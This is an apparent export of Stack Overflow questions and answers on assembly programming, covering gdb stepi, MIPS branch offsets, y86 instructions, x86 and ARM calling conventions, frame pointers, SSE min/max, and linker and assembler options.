0x0804841c :   mov    -0x8(%ebp),%edx
0x0804841f :   xor    %gs:0x14,%edx
0x08048426 :   je     0x804842d 
0x08048428 :   call   0x8048330 
0x0804842d :   add    $0x14,%esp
0x08048430 :   pop    %ecx
0x08048431 :   pop    %ebp
0x08048432 :   lea    -0x4(%ecx),%esp
0x08048435 :   ret
</pre>

<p>I set a breakpoint at  0x0804840e using</p>

<pre>
b *0x0804840e
</pre>

<p>After the program flow stops at this breakpoint I would like <code>gdb</code> to go to the next <strong>instruction</strong> instead of next <strong>line of c code</strong>. I don't think I can use <code>next</code> for this. So what other option do I have apart from setting a breakpoint at every instruction?</p>
","<p>you want to use <code>stepi</code>.  it steps by one machine instruction.</p>

<p>check <a href=""ftp://ftp.gnu.org/pub/old-gnu/Manuals/gdb/html_node/gdb_37.html"">ftp://ftp.gnu.org/pub/old-gnu/Manuals/gdb/html_node/gdb_37.html</a> for more info</p>
","7707812"
"MIPS label addressing?","8077","","<p>This is all related, and I tried to piece it all together as logically as I could, so please bear with me.</p>

<p>I'm really confused as to how to properly address labels. For example, in the following bit of code, ""bne"" translates to ""00010101001001010000000000000001"", and the label address of loopend is 0x00000020 (32)</p>

<pre><code>.text
    la $a0, opOne   
    lw $a0, 0($a0)
    la $a1, opTwo
    lw $a1, 0($a1)
    add $t0, $zero, $a0
    addi $t1, $zero, 1
    bne $t1, $a1, loopend
    addi $t1, $t1, 1
loopend:
</code></pre>

<p>When I move loopend up, ""bne"" becomes ""00010101001001011111111111111011"" and the address of loopend becomes 0x00000008 (8)</p>

<pre><code>.text
    la $a0, opOne   
    lw $a0, 0($a0)
loopend:
    la $a1, opTwo
    lw $a1, 0($a1)
    add $t0, $zero, $a0
    addi $t1, $zero, 1
    bne $t1, $a1, loopend
    addi $t1, $t1, 1
</code></pre>

<p>So from what I understand, in the first bit of code, <code>loopend</code> is after eight instructions, so its address is 4*8=32=0x00000020. In the second bit of code, <code>loopend</code> is after two instructions, so its address is 4*2, or 0x00000008.</p>

<p>What I don't understand, however, are the label addresses. Correct me if I am wrong: the label address depends on where the label is in relation to the instruction calling it. So in the first bit of code, <code>loopend</code> is two lines later than <code>bne</code> so you do not flip the signs, and its address is ""0000000000000001"". On the second <code>loopend</code> comes before <code>bne</code> so you flip the sign and its address becomes ""1111111111111011"".</p>

<p>I know you shift the addresses to the left 2 bits, but I'm still pretty confused. Do you only shift left if there are not two 0s at the end, like the second <code>loopend</code>?</p>

<p>My most pressing question is this: where does 0000000000000001, the address of <code>loopend</code>, even come from in the first bne machine language translation? I thought that address of label <code>loopend</code> would be 0000000000100000.</p>
","<pre><code>BNE -- Branch on not equal
 ___________________________________________________________________________
|Description: | Branches if the two registers are not equal                 |
|_____________|_____________________________________________________________|
|Operation:   | if $s != $t advance_pc (offset &lt;&lt; 2)); else advance_pc (4); |
|_____________|_____________________________________________________________|
|Syntax:      | bne $s, $t, offset                                          |
|_____________|_____________________________________________________________|
|Encoding:    | 0001 01ss ssst tttt iiii iiii iiii iiii                     |
|_____________|_____________________________________________________________|
</code></pre>

<p>For the first bne the offset is 1, so 1 &lt;&lt; 2 = 4 so you increment the program counter by four bytes. Since the word size is 32 bits the pc is incremented by one instruction</p>

<pre class=""lang-mips prettyprint-override""><code>.text
    la $a0, opOne   
    lw $a0, 0($a0)
    la $a1, opTwo
    lw $a1, 0($a1)
    add $t0, $zero, $a0
    addi $t1, $zero, 1
    bne $t1, $a1, loopend
    addi $t1, $t1, 1 # increment by 1 insruction
loopend:             # to here (well the next instruction)
</code></pre>

<p>For the second bne the offset is b1111111111111011, sign extended its -5 so -5 &lt;&lt; 2 = -20 so you increment the program counter by - 20 bytes or decrement it by 20 bytes. Since the word size is 32 bits the pc is decremented by five instructions</p>

<pre class=""lang-mips prettyprint-override""><code>.text
    la $a0, opOne   
    lw $a0, 0($a0)
loopend:                  # 
    la $a1, opTwo         # 5 to here
    lw $a1, 0($a1)        # 4 ^
    add $t0, $zero, $a0   # 3 |
    addi $t1, $zero, 1    # 2 |
    bne $t1, $a1, loopend # 1 |
    addi $t1, $t1, 1      # decrement by 5 instructions
</code></pre>
","16287556"
"List of y86 commands?","8061","","<p>I am looking for a way to convert some code into it's y86 equivalent.  The problem is I am having trouble finding a good list of y86 functions.  I can find some functions but not a good list of the main functions available.  Does anyone know where I could find such a list?</p>
","<p>See <a href=""http://csapp.cs.cmu.edu/public/ch4-preview.pdf"" rel=""nofollow"">Chapter 4: Processor Design (Preview)</a> which is from <a href=""http://rads.stackoverflow.com/amzn/click/013034074X"" rel=""nofollow"">Computer Systems: A Programmers Perspective</a><sup>1</sup> which has a great reference of all of the available functions.  You have to scroll down a ways to find the reference.  But it is there.</p>

<p>The instructions listed are:</p>

<pre><code>halt
nop
rrmovl
irmovl
rmmovl
mrmovl
OPl (integer operation)
    addl
    subl
    andl
    xorl
jXXX (branch condition)
    jmp
    jle
    jl
    je
    jne
    jge
    jg
cmovXX (data transfer condition)
    cmovle
    cmovl
    cmove
    cmovne
    cmovge
    cmovg 
call
ret
pushl
popl    
</code></pre>

<hr>

<p><sup>1</sup> This was authored by Randal E. Bryant and David R. O’Hallaron, who wrote an earlier paper that <em>omitted</em> the Data Transfer Conditional operators.</p>
","13055672"
"How to get the value of an array element in x86 assembly when I have the address of the first index","8053","","<p>I need to call an assembly procedure in a C program. In my C program I have the address of an array and in my assembly procedure I need to obtain the value of the second index of the array. If I had the array itself as a parameter, it would be easier for me. Could you please tell me how could I get the content of the second element of the array?</p>

<p>In my C program, I am calling this function:</p>

<pre><code>getIndex(&amp;array[0]);  
</code></pre>

<p>If the parameter was not an address, my soluton in the assembly procedure would be this:</p>

<pre><code>PUSH BP
MOV BP,SP
push SI

MOV SI,[BP+4]
ADD CX,SI
ADD SI,2
MOV AX,SI ; AX got the value of the second index of the array
</code></pre>

<p>How should I solve my issue? Thanks for helping.</p>
","<p>Basically you need one more memory address de-reference (the brackets), but there are also some additional issues with your code.</p>

<p>Looking at your code I assume that the size of elements in the array is 2 bytes, you are using the <a href=""http://en.wikipedia.org/wiki/X86_calling_conventions#cdecl"" rel=""nofollow"">cdecl</a> calling convention, and have a 16-bit processor. Here are the issues:</p>

<ol>
<li>If you push SI to the stack, you should also pop it</li>
<li>You are adding the value of SI to CX but never use the value in CX</li>
<li>The procedure does not revert BP and SP of the caller, nor return to where the procedure was called from</li>
</ol>

<p>Here's the code with the issues fixed:</p>

<pre><code>push bp
mov bp,sp
push si
mov si,[bp+4] ; si = address of the first element in the array
mov ax,[si+2] ; ax = value of the second element in the array
pop si        ; revert si
mov sp,bp     ; revert the caller's stack pointer
pop bp        ; revert the caller's base pointer
ret           ; jump to the instruction after the call
</code></pre>
","16003687"
"How to execute machine code (learning assembly)","8034","","<p>I'd like to have a go at learning assembly, and possibly writing my own simple assembler (I recently read an interesting article on how to create an operating system, and quickly realised that a certain familiarity with assembly would help me out a lot here).</p>

<p>The trouble is that although I'm sure I'll have no problems finding articles and guides on assembly language / machine code, I tend to learn by doing, and I'd really like to have a go at executing my code. I figure I have two options:</p>

<ul>
<li>Learn how to create a windows executable</li>
<li>Use some sort of virtual machine / emulator</li>
</ul>

<p>The second option sounds better to me, as it protects me from potentially making stupid mistakes, and will probably more closely resemble the environment I'll be in while writing an OS, but I'm not really sure how to do either.</p>
","<p>Great place to learn windows assembly programming for x86 is legendary <a href=""http://win32assembly.programminghorizon.com/"" rel=""nofollow noreferrer"">Iczelion's tutorials</a>.</p>

<p>You can also find MASM tools <a href=""http://www.masm32.com/"" rel=""nofollow noreferrer"">here</a></p>

<p>and if you have the patience, #asm on EFNET</p>
","1265540"
"how to count cycles?","7958","","<p>I'm trying to find the find the relative merits of 2 small functions in C. One that adds by loop, one that adds by explicit variables. The functions are irrelevant themselves, but I'd like someone to teach me how to count cycles so as to compare the algorithms. So f1 will take 10 cycles, while f2 will take 8. That's the kind of reasoning I would like to do. No performance measurements (e.g. <code>gprof</code> experiments) at this point, just good old instruction counting.</p>

<p>Is there a good way to do this? Are there tools? Documentation? I'm writing C, compiling with <code>gcc</code> on an x86 architecture.</p>
","<p><a href=""http://icl.cs.utk.edu/papi/"" rel=""noreferrer"">http://icl.cs.utk.edu/papi/</a></p>

<blockquote>
  <p>PAPI_get_real_cyc(3) - return the total number of cycles since some arbitrary starting point </p>
</blockquote>
","5121567"
"Why do we need to define .data and .text section in assembly?","7947","","<p>I'm reading an assembly book. The book explains that there are .text and .data section in a computer's memory. An example in the book also use the following source code.</p>

<pre><code>[SECTION .data]

[SECTION .text]
</code></pre>

<p>since the above code snippet is written in assembly, I have a question.</p>

<p>Do .data and .text codes separated in physical memory (if so why? and does CPU care?) ? or is it just us (human) to separate them in the assembly language?</p>
","<p>Text section of application is read-only while Data is not. Many OS load Text section into memory only once no matter how many times application was launched. This reduce memory usage and launch time and is safe because code doesn't change.
Data section contains informations that could be changed during application execution and this section must be copied for every instance.</p>
","7254310"
"x86 max/min asm instructions?","7943","","<p>Are there any asm instructions that can speed up computation of min/max of vector of doubles/integers on Core i7 architecture?</p>

<p><strong>Update:</strong></p>

<p>I didn't expect such rich answers, thank you.
So I see that max/min is possible to do without branching.
I have sub-question:</p>

<p>Is there an efficient way to get the index of the biggest double in array?</p>
","<p>SSE4 has <code>PMAXSD</code> or <code>PMAXUD</code> for 32 bit signed/unsigned integers, which might be useful. </p>

<p>SSE2 has <code>MAXPD</code> and <code>MAXSD</code> which compare between and across pairs of doubles, so you follow n/2-1 MAXPDs with one MAXSD to get the max of a vector of n, with the usual interlacing of loads and operations.</p>

<p>There are MIN equivalents of the above.</p>

<p>For the double case, you're probably not going to do better in assembler than a half-decent C++ compiler in SSE mode:</p>

<pre><code>peregrino:$ g++ -O3 src/min_max.cpp -o bin/min_max
peregrino:$ g++ -O3 -msse4 -mfpmath=sse src/min_max.cpp -o bin/min_max_sse
peregrino:$ time bin/min_max
0,40

real    0m0.874s
user    0m0.796s
sys 0m0.004s
peregrino:$ time bin/min_max_sse 
0,40

real    0m0.457s
user    0m0.404s
sys 0m0.000s
</code></pre>

<p>where min_max computes min and max of an array of 500 doubles 100,000 times using a naive loop:</p>

<pre><code>bool min_max ( double array[], size_t len, double&amp; min, double&amp; max )
{
    double min_value = array [ 0 ];
    double max_value = array [ 0 ];

    for ( size_t index = 1; index &lt; len; ++index ) {
        if ( array [ index ] &lt; min_value ) min_value = array [ index ];
        if ( array [ index ] &gt; max_value ) max_value = array [ index ];
    }

    min = min_value;
    max = max_value;
}
</code></pre>

<hr>

<p>In response to part two, the traditional optimisation to remove branching from a max operation is to compare the values, get the flag as a single bit ( giving 0 or 1 ), subtract one ( giving 0 or 0xffff_ffff) and 'and' it with the xor of the two possible results, so you get the equivalent of <code>( a &gt; best ?  ( current_index ^ best_index ) : 0 )  ^ best_index )</code>. I doubt there's a simple SSE way of doing that, simply because SSE tends to operate on packed values rather than tagged values; there are some horizontal index operations, so you could try finding the max, then subtracting that from all elements in the original vector, then gather the sign bit, and the zero signed one would correspond to the index of the max, but that would probably not be an improvement unless you were using shorts or bytes. </p>
","1969860"
"Frame pointer, epb, and return address","7915","","<p>The following image is from wikipedia <a href=""http://en.wikipedia.org/wiki/Call_stack"" rel=""nofollow noreferrer"">entry</a> on call stack and there is something that I don't understand completely:</p>

<p><img src=""https://i.stack.imgur.com/umtOF.jpg"" alt=""alt text""></p>

<p>I thought the frame pointer which is stored in ebp register is initialized as such in the prologue*:</p>

<pre><code>push ebp  ; Preserve current frame pointer 
mov ebp, esp ; Create new frame pointer pointing to current stack top 
sub esp, 20 ; allocate 20 bytes worth of locals on stack. 
</code></pre>

<p>If so, then shouldn't the frame pointer in the image be pointing to after the return address and before it should be the previous frame pointer address and before that the return address? What am I missing?</p>

<p>Thanks!</p>

<p>*Taken from: <a href=""https://stackoverflow.com/questions/1395591/what-is-exactly-the-base-pointer-and-stack-pointer-to-what-do-they-point"">What is exactly the base pointer and stack pointer? To what do they point?</a> </p>
","<p>Yes, you are right, frame pointer points to an address where is stored previous frame pointer, before return address. The correct picture would be </p>

<pre><code>               | locals
               +---------
frame pointer-&gt;| prev frame pointer
               +--------
               | return address
               +--------
</code></pre>
","4426353"
"Adding floating point/double numbers in assembly","7902","","<p>I am trying to experiment with inline assembly, and I am trying to add decimal numbers (no, NOT integers) in inline assembly. Issue is, when I call the following function:</p>

<pre><code>inline double ADD(double num1, double num2) {
  double res;
_asm{

    push eax; push the former state of eax onto stack
    mov eax, num1;
    add eax, num2;
    mov res, eax;
    pop eax; restore the former state of eax now that we are done   
     }  return res;}
</code></pre>

<p>The compiler complains of improper operand size at the inline assembly (ALL lines of assembly excluding the push and pop instruction lines). So I have to change to an integer type, such as unsigned long, and then it works, but of course only supports integer types; decimal results are rounded. </p>

<p>Is there any way to add in assembly that allows for decimal results like 8.4?</p>
","<p>I haven't done x87 assembly in a decade, but it should be something like:</p>

<pre><code>fld num1   ; load num1 and push it onto the fpu stack
fld num2   ; load num2 and push it onto the fpu stack
faddp      ; pop two numbers, add them, push sum on the stack
fstp res   ; pop sum from the stack and store it in res
</code></pre>
","11853280"
"Return from a procedure in ARM assembly","7873","","<p>When creating a function in ARM assembly, I usually push contents of <code>LR</code> register into <code>r4-r5</code> at the beggining and after the function has finished I pop <code>r4-r5</code> to <code>PC</code>:</p>

<pre><code>.global myfunc
.type   myfunc, %function

myfunc:
push {r4-r5,lr}
... do stuff...
pop {r4-r5,pc}
</code></pre>

<p>However, I have read that using <code>stmfd</code> and <code>ldmfd</code> one might get better performance: </p>

<pre><code>myfunc:
stmfd sp!,{r4-r11,lr}
...do stuff...
ldmfd sp!,{r4-r11,pc}
</code></pre>

<p>What is exactly the <code>sp</code>? I presume it's not really worth saving all the registers <code>r4-r11</code> in case I'm not actually using them inside <code>myfunc</code>, right? So the push-pop variant is better in that case?</p>
","<p><code>PUSH {...}</code> is the Thumb equivalent of the ARM instruction <code>STMDB SP!,{...}</code><br></p>

<p><code>POP {...}</code> is the Thumb equivalent of the ARM instruction <code>LDMIA SP!,{...}</code></p>

<p><strong>STM</strong> means STore Multiple.<br>
<strong>DB</strong> means Decrement Before, i.e. decrement the destination address before each store in this case.<br>
<strong>IA</strong> means Increment After, i.e. increment the source address after each load in this case.<br>
<strong>!</strong> means write back the final address to the source/destination address register. For example if <code>SP</code> was 0x100 and you did <code>STMDB SP!,{R0-R2}</code> you'd have 0xF4 in <code>SP</code> afterwards.<br>
<strong>SP</strong> is an alias for <code>R13</code>, and is used as the stack pointer on ARM processors.</p>
","15587383"
"ARM Assembly: How to pass and make use of a array of pointers inside an ARM Assembly function","7868","","<p>I have a C function in which I have 4 pointers and each of them point to different locations of a large 2D array of floats.</p>

<p>Because the ARM assembly functions can only be passed with 4 parameters (r0 - r3), I'm not able to understand how to pass the pointer to my return value, which will become the 5th parameter to my assembly function.</p>

<p>So, to overcome this, I thought of putting all the 4 pointers into an array of pointers, so that I will have 3 more free spots, using which I can pass a pointer to my return value as well.</p>

<p>But, I don't know how I can extract the four individual pointers from my array of pointers, inside the assembly function. I'm failing in my attempts.</p>

<p>Here is a sample of what I'm trying to do.</p>

<h2>Program</h2>

<pre><code>#include&lt;stdio.h&gt;

void  _my_arm_asm(float32_t *);

float32_t data_array[100][100];

void main()
{
       float32_t *ptr1, *ptr2, *ptr3, *ptr4;

        ptr1 = \\ data_array[value] + (some value);
        ptr2 = \\ data_array[value] + (some other value);
        ptr3 = \\ data_array[value] + (some other value);
        ptr4 = \\ data_array[value] + (some other value);

       float32_t *array_pointers[4];
       array_pointers[0] = ptr1;
       array_pointers[1] = ptr2;
       array_pointers[2] = ptr3;
       array_pointers[3] = ptr4;

       float32x4_t result;

       _my_arm_asm(array_pointers, &amp;result);

        ....
        ....
        ....
       return 0;


}



.text
    .global _my_arm_asm

_my_arm_asm:
            #r0: Pointer to my array of pointers
            #r1: Pointer to my result

        push   {r4-r11, lr}

        # How to access the array of pointers?

        # I previously tried this, is this the right way to do it?

        # mov r4, #0
        # vld4.32 {d0, d1, d2, d3}, [r0, r4]
        # add r4, r4, #1
        # vld4.32 {d4, d5, d6, d7}, [r0, r4] 
        # add r4, r4, #1
        # vld4.32 {d8, d9, d10, d11}, [r0, r4] 
        # add r4, r4, #1
        # vld4.32 {d12, d13, d14, d15}, [r0, r4] 


        ....
        ....
        ....

        pop    {r4-r11, pc}
</code></pre>
","<p>In general, if more than 4 arguments are passed to a function the excess arguments are passed on the stack.</p>

<p>The ARM EABI specifies how compilers should pass arguments to functions (it also specifies which registers a caller can expect to be unchanged across the function call).  Your assembly routine can use the same techniques (and probably should unless you have a good reason not to).  If nothing else, that'll mean that your assembly function can be easily called from C.</p>

<ul>
<li><a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.subset.swdev.abi/index.html"" rel=""nofollow"">http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.subset.swdev.abi/index.html</a></li>
</ul>

<p>Chapter 5 (The Base procedure Call Standard) of the ""Procedure Call Standard for the ARM Architecture"" should have the exact details. It's pretty complex on the face of it (becuase there's a lot of detail on alignment, argument size, etc), but I think for your purposes it boils down to that the 5th argument to the function get's pushed onto the stack.</p>

<ul>
<li><a href=""http://infocenter.arm.com/help/topic/com.arm.doc.ihi0042d/IHI0042D_aapcs.pdf"" rel=""nofollow"">http://infocenter.arm.com/help/topic/com.arm.doc.ihi0042d/IHI0042D_aapcs.pdf</a></li>
</ul>

<p>Of course, as you suggest in your question, you could avoid all that by packing your 4 pointers into a structure and passing a pointer to the struct - in your assembly routine you simple load that struct pointer into a register and use that to in turn load the pointers you really need.</p>

<p>I think that the ARM assembly might look something like:</p>

<pre><code>                 // r0 has the 1st parameter
ldr r4, [r0]     // get array_pointers[0] into r4
// ...

ldr r5, [r0, #4] // get array_pointers[1] into r5
// ...

ldr r6, [r0, #8] // get array_pointers[2] into r6
</code></pre>

<p>You could also use a 'load multiple' instruction to get all 4 pointers in one shot, but I'm not sure what you register usage requirements/restrictions might be.</p>
","3823821"
"What is the purpose of the RBP register in x86_64 assembler?","7867","","<p>So I'm trying to learn a little bit of assembly, cuz I need it for Computers Architecture class. I wrote a few programs, like printing Fibonacci sequence, etc. I recognized that whenever I write program I use those 3 lines (as I learned from comparing assembly code generated from <code>gcc</code> to it's <code>C</code> equivalent):</p>

<pre><code>pushq   %rbp
movq    %rsp, %rbp
subq    $16, %rsp
</code></pre>

<p>I have 2 questions about it:</p>

<ol>
<li>First of all, why do I use <code>%rbp</code>? Isn't it simplier to use <code>%rsp</code>, as its contents are moved to <code>%rbp</code> on the 2nd line?</li>
<li>Why do I have to subtract anything from <code>%rsp</code>? I mean it's not always <code>16</code> (when I was <code>printf</code>ing line 7 or 8 variables, then I wold subtract <code>24</code> or <code>28</code></li>
</ol>

<p>I use Manjaro 64 bit on a Vitrual Machine (4 GB RAM), Intel 64 bit processor</p>
","<p><code>rbp</code> is the frame pointer on x86_64.  In your generated code, it gets a snapshot of the stack pointer (<code>rsp</code>) so that when adjustments are made to <code>rsp</code> (i.e. reserving space for local variables or <code>push</code>ing values on to the stack), local variables and function parameters are still accessible from a constant offset from <code>rbp</code>. </p>

<p>A lot of compilers offer frame pointer omission as an optimization option; this will make the generated assembly code access variables relative to <code>rsp</code> instead and free up <code>rbp</code> as another general purpose register for use in functions.</p>

<p>In the case of GCC, which I'm guessing you're using from the AT&amp;T assembler syntax, that switch is <code>-fomit-frame-pointer</code>.  Try compiling your code with that switch and see what assembly code you get.  You will probably notice that when accessing values relative to <code>rsp</code> instead of <code>rbp</code>, the offset from the pointer varies throughout the function.</p>
","41912747"
"Workflow for writing ARM assembly code on the iphone","7859","","<p>I would like to begin writing ARM assembler and running it on the iPhone. </p>

<p>This is not with the intent of using in an app to be released to the app store - Basically I would like to solve problems on <a href=""http://projecteuler.net"" rel=""noreferrer"">ProjectEuler</a> using ARM and the iPhone, just for hobby and educational purposes. </p>

<p>How can I go about doing this? I have not been able to come up with a way get a project running using any hand written arm.</p>
","<p>I haven't been able to find any information about how to write assembly code specifically for the iPhone, but like the other people said here, you can either:</p>

<p>1) write inline asm statements in C/C++/ObjC code, or
2) write standalone assembly functions in a '.s' file and simply add it in your XCode sources, or
3) write standalone assembly functions for an external assembler such as NASM. You write assembly code in a '.s' file and generate a '.o' object file using NASM and link the object file with your project in XCode.</p>

<p>So if you are just trying to write a few assembly instructions then inline assembler would be the easiest way, but if you plan on writing several assembly functions then I'd recommend a standalone assembly file. And if you plan on writing many assembly functions with macros and want cross-platform compatibility, etc, then I'd recommend using NASM to compile your assembly code into an object file. Because I am using the XCode gcc assembler and it is quite lacking compared to NASM. You can get NASM for free at <a href=""http://www.nasm.us/"" rel=""noreferrer"">http://www.nasm.us/</a></p>

<p>Once you have setup your assembler environment, you need to learn how to write ARM Assembly code! Because the iPhone (and many other portable devices and smartphones) use the ARM instruction set. There is a very good but old intro to ARM assembly at <a href=""http://www.coranac.com/tonc/text/asm.htm"" rel=""noreferrer"">http://www.coranac.com/tonc/text/asm.htm</a>.</p>

<p>When it comes to assembly programming, the official instruction set reference manual is usually the main source of information for everything you will write, so you should go to the ARM website and download the <a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.qrc0001m/index.html"" rel=""noreferrer"">ARM and Thumb-2 Quick Reference Card</a> (6 pages long) as well as the 2 full documents for your exact CPU.</p>

<p>For example, the iPhone 3GS and iPhone 4 both have an ARMv7-A Cortex-A8 CPU, so you can download the <a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.qrc0001m/index.html"" rel=""noreferrer"">ARM Architecture Reference Manual ARMv7-A and ARMv7-R Edition</a> (2000 pages long) that tells you exactly which instructions are available and exactly how they work, and the <a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.qrc0001m/index.html"" rel=""noreferrer"">Cortex™-A8 Technical Reference Manual</a> that explains the instruction timing, etc for your specific CPU.</p>
","3796431"
"Force GNU linker to generate 32 bit ELF executables","7855","","<p>Hi I am currently generating x86 assembly for a compiler that I am writing and am having some trouble linking the file on my 64-bit VM (the assembly code is 32 bit). </p>

<p>I was able to assemble the object file fine with this command:</p>

<pre><code>as --32 mult.S -o mult.o
</code></pre>

<p>but I can't seem to find any options for <code>ld</code> that make it generate a 32-bit ELF file:</p>

<pre><code>ld &lt;some-option?&gt; mult.o -o mult
</code></pre>

<p>Any help would be great. </p>
","<blockquote>
  <p><code>ld &lt;some-option?&gt; mult.o -o mult</code></p>
</blockquote>

<pre><code>ld -m elf_i386 mult.o -o mult
</code></pre>

<p>You can get a list of available architectures with:</p>

<pre><code>ld -V
</code></pre>

<p>Sample output:</p>

<pre><code>GNU ld (GNU Binutils for Ubuntu) 2.24
  Supported emulations:
   elf_x86_64
   elf32_x86_64
   elf_i386
   i386linux
   elf_l1om
   elf_k1om
   i386pep
   i386pe
</code></pre>

<p>However, that shouldn't be necessary: ld looks at the first object, and should automatically select emulation based on the format of that object.</p>
","16004418"
"How do I interpet this x86_64 assembly opcode?","7830","","<p>Looking at some assembly code for x86_64 on my Mac, I see the following instruction:</p>

<pre><code>48 c7 c0 01 00 00 00  movq    $0x1,%rax
</code></pre>

<p>But nowhere can I find a reference that breaks down the opcode. It seems like 48c7 is a move instruction, c0 defines the %rax register, etc.</p>

<p>So, where can I find a reference that tells me all that?</p>

<p>I am aware of <a href=""http://ref.x86asm.net/"" rel=""noreferrer"">http://ref.x86asm.net/</a>, but looking at 48 opcodes, I don't see anything that resembles a move.</p>
","<p>Actually, <code>mov</code> is <a href=""http://ref.x86asm.net/coder64.html#xC7"" rel=""noreferrer"">0xc7</a> there; 0x48 is, in this case, a long mode <a href=""http://wiki.osdev.org/X86-64_Instruction_Encoding#REX_prefix"" rel=""noreferrer"">REX.W prefix</a>.</p>

<p>Answering also the question in comments: 0xc0 is b11000000. <a href=""http://wiki.osdev.org/X86-64_Instruction_Encoding#64-bit_addressing"" rel=""noreferrer"">Here</a> you can find out that with <code>REX.B = 0</code> (as REX prefix is 0x48, the .B bit is unset), 0xc0 means ""RAX is first operand"" (in Intel syntax; <code>mov rax, 1</code>, RAX is first, or, in case of <code>mov</code>, output operand). You can find out how to read ModR/M <a href=""http://wiki.osdev.org/X86-64_Instruction_Encoding#ModR.2FM"" rel=""noreferrer"">here</a>.</p>
","11180774"
"How to remove newline in MIPS?","7830","","<p>So I am busy writing a MIPS program that will take an input string, and then print all possible UNIQUE permutations of that string.  (AKA if the word is LoOp, LoOp and LOop are the same).</p>

<p>In order to do this, I know I need to NOT have a newline character on the end of my input string, but I don't know to make sure it's not added.  Here is what I have so far:</p>

<pre><code>.data


newLine:
    .asciiz ""\n""
promptUser:
    .asciiz ""Enter a 20 letter or less word:\n""
word:
    .space 21

.text

main:

    la $a0, promptUser
    li $v0, 4       # Ask User for Input
    syscall

    la $a0, word
    li $a1,21       # Max number of characters 20
    li $v0,8
    syscall         # Prompting User

    la $a0,newLine      # Newline   
    li $v0, 4
    syscall

    la $a0, word        # Printing Word
    li $v0, 4
    syscall
</code></pre>

<p>The only time a '\n' isn't included is when the number of letters entered is exactly 20.  Any suggestions??</p>

<p>FIX:</p>

<p>This works:</p>

<pre><code>    li $s0,0        # Set index to 0
remove:
    lb $a3,word($s0)    # Load character at index
    addi $s0,$s0,1      # Increment index
    bnez $a3,remove     # Loop until the end of string is reached
    beq $a1,$s0,skip    # Do not remove \n when string = maxlength
    subiu $s0,$s0,2     # If above not true, Backtrack index to '\n'
    sb $0, word($s0)    # Add the terminating character in its place
skip:
</code></pre>
","<p>You can parse the string upon returning from syscall 8 to remove the character:</p>

<pre><code># your code to prompt the user        

    xor $a2, $a2, $a2
loop:
    lbu $a3, word($a2)  
    addiu $a2, $a2, 1
    bnez $a3, loop       # Search the NULL char code
    beq $a1, $a2, skip   # Check whether the buffer was fully loaded
    subiu $a2, $a2, 2    # Otherwise 'remove' the last character
    sb $0, word($a2)     # and put a NULL instead
skip:

# your code continues here
</code></pre>

<p>Also note that you didn't reserve enough space for the word. You should reserve 21 bytes with</p>

<pre><code>word: .space(21)
</code></pre>
","13631756"
"Define a function with parameters in MASM assembly language","7828","","<p>I'm trying to write a function in x86 assembly language that will accept three parameters. Is it possible to define a function in MASM assembly language with multiple parameters?</p>

<pre><code>//this is pseudocode: I'm trying to convert this to a valid macro in MASM
//if var1 is equal to var2, jump to the label jumpToHere
function jumpIfEqual(var1, var2, jumpToHere){
    cmp var1, var2;
    je jumpToHere;
}
</code></pre>

<p>If I could write a valid function to do this, then <code>jumpIfEqual(5, 5, jumpToHere)</code> would be equivalent to</p>

<pre><code>cmp 5, 5;
je jumpToHere;
</code></pre>
","<p><a href=""http://msdn.microsoft.com/en-us/library/01d2az3t%28v=vs.80%29.aspx"" rel=""nofollow"">Yes, you can</a>.</p>

<p>For example:</p>

<pre><code>jumpIfEqual PROC var1:DWORD, var2:DWORD, jmpAddress:DWORD
    mov eax,var1
    cmp eax,var2
    jne skip
    pop eax
    push jmpAddress
    skip:
    ret
jumpIfEqual ENDP

....

push OFFSET jumpToHere
mov eax, 5
push eax
push eax
call jumpIfEqual
</code></pre>
","15347695"
"Bits bytes words and dwords - when to use what in assembly?","7800","","<p>I am trying to learn assembly (more like struggling) and I have come across the data types bytes, words, dwords etc.</p>

<p>What really confuses me is when do you know to use one over the other. Obviously you want to use the most conservative option, but how do I know to choose a byte over a word? For example 1 word = 16 bits or 2 bytes. Does that mean I can fit 16 characters inside 1 word? So to save the alphabet I would need to declare 2 words?</p>

<p>Same goes for registers (16 bit, 32 bit and 64 bit). I know you can use smaller registers such as <code>al</code> and <code>ah</code> instead of <code>eax</code> when you are manipulating smaller sizes of data. For a 16 bit register can you move a data type larger than a word into it because since it's 16 bits, it can fit a 16 bit word?</p>

<p>Wrapping my head around this whole concept is difficult. If anybody happens to have any good resources or information I can look at, that would be great. Cheers!</p>
","<p>Choosing the right data width to use can be hard at first, but it'll be easy once you get used to it. Here are some questions to consider, with the most important considerations mentioned first.</p>

<p><strong>Will the algorithm behave correctly?</strong> Say you wanted to compute 180 × 247 and print the result. Each operand fits in an unsigned byte, but the product doesn't. Or say you wanted to represent the size of a file, which are easily many megabytes large. Then you will need something wider than a 16-bit integer to represent the size.</p>

<p><strong>What is the input/output format?</strong> If you expect other code to call your function with an array of bytes, then you must read the data elements as bytes; there is no other choice. You can convert to a wider representation temporarily for processing, though.</p>

<p><strong>How much memory will it use?</strong> If you have a billion database records and each record uses a byte, then the total data size would be 1 GB. If each record used a dword, then the total data size would 4 GB. Small differences when multiplied by huge numbers will give huge differences.</p>

<p>In summary, it doesn't really matter what data width you use, as long as you can write correct code, interface with other code, and keep memory usage small enough that you can run your program. So using dword as a default wouldn't be a bad idea.</p>
","9476306"
"How to use AVX/pclmulqdq on Mac OS X","7780","","<p>I am trying to compile a program that uses the pclmulqdq instruction present in new Intel processors. I've installed GCC 4.6 using macports but when I compile my program (which uses the intrinsic _mm_clmulepi64_si128), I get</p>

<pre><code>/var/folders/ps/sfjmtgx5771_qbqnh4c9xclr0000gn/T//ccEAWWhd.s:16:no such
instruction: `pclmulqdq $0, %xmm0,%xmm1'
</code></pre>

<p>It seems that GCC is able to generate the correct assembly code from the instrinsic, but the assembler does not recognize the instruction.</p>

<p>I've installed binutils using macports, but the problem persists. How do I know which assembler gcc is using? The XCode assembler probably does not support it, but the binutils assembler should.</p>
","<p>A simpler solution that fixed this problem for me was adding <code>-Wa,-q</code> to the compiler flags. From the man pages for <code>as</code> (version 1.38):</p>

<blockquote>
  <p>-q<br><br>
  &nbsp;&nbsp;&nbsp;&nbsp; Use  the  clang(1)  integrated  assembler instead of the GNU based system assembler.</p>
</blockquote>

